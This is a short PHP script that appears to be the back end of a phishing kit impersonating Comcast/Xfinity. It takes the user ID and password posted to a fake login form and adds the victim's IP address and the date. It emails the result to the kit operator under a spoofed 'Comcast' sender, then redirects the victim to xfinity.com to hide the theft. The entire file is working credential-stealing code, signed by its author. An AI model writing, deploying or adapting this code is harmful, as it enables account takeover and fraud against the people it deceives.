<?php

include 'Email.php';

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "---------=ReZulT=---------\n";
$message .= "Online ID: ".$_POST['user']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=by El-D3M0 =---------\n";
$subject = "Demo is Still Here M-F's";
$headers = "From: Comcast<user@n1.com>";

mail($SEND,$subject,$message,$headers);

$header = "http://xfinity.com";
header("Location: $header");

?>